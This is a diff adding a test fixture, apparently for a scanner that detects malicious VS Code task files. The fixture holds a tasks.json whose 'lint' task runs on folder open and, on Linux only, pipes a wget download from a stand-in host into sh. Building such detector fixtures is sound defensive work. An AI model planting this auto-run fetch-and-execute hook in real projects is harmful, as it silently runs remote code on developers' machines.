@@ -1,0 +1,15 @@
+# PolinRider: a folder-open task with a command for each OS, the bad one only on Linux
+want: editor-task-command suspicious-command
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "lint",
+      "type": "shell",
+      "command": "npm run lint",
+      "linux": {"command": "wget -qO- 'https://x.example/settings/linux?flag=5' | sh"},
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
